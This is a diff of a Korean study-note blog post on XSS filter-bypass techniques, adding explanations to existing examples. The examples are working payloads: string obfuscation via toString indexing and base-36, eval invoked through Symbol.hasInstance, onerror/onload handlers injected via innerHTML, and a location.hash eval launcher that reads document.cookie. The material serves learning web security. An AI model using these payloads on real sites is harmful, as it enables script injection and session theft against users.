@@ -13,7 +13,7 @@ toc: true
 toc_sticky: true
 
 date: 2025-07-28
-last_modified_at: 2025-07-30
+last_modified_at: 2025-08-03
 ---
 
 ## 🦥 본문
@@ -195,42 +195,44 @@ true => !![]
         ${bar} ${1+1}.`; // "Hello,\nWorld 2."
         ```
         
-    - RegExp 객체 사용 : RegExp 객체 생성하고 객체의 패턴 부분을 가져와서 문자열 생성 가능
-    
-    ```html
-    var foo = /Hello World!/.source;  // "Hello World!"
-    var bar = /test !/ + [];  // "/test !/"
-    ```
-    
+    - RegExp 객체 사용 : RegExp 객체 생성하고 객체의 패턴 부분을 가져와서 문자열 생성 가능.
+        - `source`를 이용하면 정규표현식에서 문자열 패턴만 가져온다.
+        - 정규표현식에 `+ []` 빈 배열이 더해지면 문자열로 변환
+            
+            ```html
+            var foo = /Hello World!/.source;  // "Hello World!"
+            var bar = /test !/ + [];  // "/test !/"
+            ```
+            
     - String.fromCharCode 함수 사용
-    
-    ```html
-    var foo = String.fromCharCode(72, 101, 108, 108, 111);  // "Hello"
-    ```
-    
+        
+        ```html
+        var foo = String.fromCharCode(72, 101, 108, 108, 111);  // "Hello"
+        ```
+        
     - 기본 내장 함수나 객체의 문자 사용 : `toString` 함수를 이용해 문자열로 변환
-    
-    ```html
-    
-    //history.toString() => [object History] 반환
-    var baz = history.toString()[8] + // "H"
-    
-    //산술 연산 시 객체 내부적으로 문자열 변환
-    (history+[])[9] + // "i"
-    
-    //URL.toString() => function URL(){[native code]} 반환
-    (URL+0)[12] + // "("
-    (URL+0)[13]; // ")" ==> "Hi()"
-    ```
-    
+        
+        ```html
+        
+        //history.toString() => [object History] 반환
+        var baz = history.toString()[8] + // "H" [object H...에서 8번째 인덱스
+        
+        //산술 연산 시 객체 내부적으로 문자열 변환
+        (history+[])[9] + // "i"
+        
+        //URL.toString() => function URL(){[native code]} 반환
+        (URL+0)[12] + // "("  function URL(.... 12번째 인덱스 
+        (URL+0)[13]; // ")" ==> "Hi()"
+        ```
+        
     - 숫자 객체의 진법 변환 : 아스키 코드를 이용. 문법 에러를 피하기 위해 괄호, 점 두개, 공백과 점을 이용
-    
-    ```html
-    var foo = (29234652).toString(36); // "hello"
-    var foo = 29234652..toString(36); // "hello"
-    var bar = 29234652 .toString(36); // "hello"
-    ```
-    
+        
+        ```html
+        var foo = (29234652).toString(36); // "hello"
+        var foo = 29234652..toString(36); // "hello"
+        var bar = 29234652 .toString(36); // "hello"
+        ```
+
 - 함수 호출 : 함수 호출을 위해서는 소괄호 또는 백틱 사용.
     
     ```html
@@ -246,16 +248,29 @@ true => !![]
         location['href']="javascript:alert\050document.domain\051;";
         ```
         
-    - `Symbol.hasInstance` 오버라이딩 : `Symbol.hasInstance` well-known symbol을 이용하면 `instanceof` 연산자를 오버라이드
+    - `Symbol.hasInstance` 오버라이딩 : `Symbol.hasInstance` well-known symbol을 이용하면 `instanceof` 연산자를 오버라이드. 즉 `Symbol.hasInstance`를 사용자 정의 함수로 덮어써서 `instance` 연산이 실행될 때 사용자의 코드 실행 가능
         - Symbol : 원시 데이터 타입. 유일하고 변경 불가능한 값 생성
-        
-        ```html
-        "alert\x28document.domain\x29"instanceof{[Symbol.hasInstance]:eval};
-        Array.prototype[Symbol.hasInstance]=eval;"alert\x28document.domain\x29"instanceof[];
-        ```
-
+            
+            ```html
+            foo instanceof Bar 
+            
+            //JS 내부 동작
+            Bar[Symbole.Instance](foo)
+            ```
+            
+            ```html
+            "alert\x28document.domain\x29"instanceof{[Symbol.hasInstance]:eval};
+            -> alert(document.domain) instanceof { [Symbol.hasInstance]: eval }
+            -> eval[Symbol.hasInstance](alert(document.domain))
+            -> eval(alert(document.domain))
+            
+            Array.prototype[Symbol.hasInstance]=eval; //instanceof[] 연산에서 eval()이 호출되도록 전역 설정
+            "alert\x28document.domain\x29"instanceof[];
+            ->eval(alert(document.domain))
+            ```
+            
     - `document.body.innerHTML` 추가 : 문서 내 새로운 HTML 코드 추가 가능. 하지만 `<sciprt>` 태그는 삽입해도 실행 불가
-    
+        
         ```html
         document.body.innerHTML+="<img src=x: onerror=alert&#40;1&#41;>";
         document.body.innerHTML+="<body src=x: onload=alert&#40;1&#41;>";
@@ -271,7 +286,7 @@ true => !![]
     3. 애플리케이션이 해당 데이터를 디코딩하여 `<script>` 를 게시판 DB에 저장
     4. 희생자가 해당 게시글을 읽으면 XSS 발생
 
-더블 디코딩 : 애플리케이션 검증 로직 이후에도 디코딩을 하는 경우 발생.
+더블 디코딩 : 애플리케이션 검증 로직 이후에도 디코딩을 하는 경우 발생. urldecode()를 수행하는 경우 
 
 - EX)
     
@@ -309,12 +324,13 @@ true => !![]
 길이 제한의 경우, 다른 경로로 실행할 추가적인 코드(payload)를 URL fragment로 삽입 후, 삽입 지점에서 본 코드를 실행하는 짧은 코드 (launcher)를 사용 가능
 
 - Fragment로 스크립트를 넘겨준 후 XSS 지점에서 `location.hash`로 URL의 Fragment 부분을 추출하여 `eval()`로 실행하는 기법
+    - 짧은코드는 XSS 위치에 삽입하고 긴 코드를 URL fragment에 삽입.
     
     ```html
     https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(document.cookie); 
     ```
     
-- 쿠키에 페이로드를 저장하는 방식
+- 쿠키에 페이로드를 저장하는 방식 : 쿠키는 길게 설정 가능하므로 미리 페이로드를 심어 놓음
 - `import` 같은 외부 자원을 스크립트로 로드하는 방식
     
     ```html
